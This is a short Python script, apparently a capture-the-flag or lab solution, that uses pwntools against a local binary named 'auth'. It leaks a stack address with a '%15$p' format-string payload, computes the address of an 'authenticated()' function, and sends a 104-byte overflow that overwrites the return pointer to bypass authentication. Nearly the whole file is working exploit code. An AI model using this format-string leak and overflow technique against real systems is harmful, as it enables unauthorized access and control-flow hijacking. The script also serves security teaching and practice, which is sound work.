import pwn

proc = pwn.process("./auth", level="error")

proc.sendline(b"%15$p")
# get the main address from the response and convert it to hex
main_addr = proc.recvline().split()[4][:-1]
main_addr = int(main_addr, 16)
# calculate the offset to authenticated()
authenticated_addr = main_addr - 0x62
# write 104 of any char and then the pointer to authenticated()
proc.sendline(b"1" * 104 + pwn.util.packing.p64(authenticated_addr))
print(proc.recvline())

proc.close()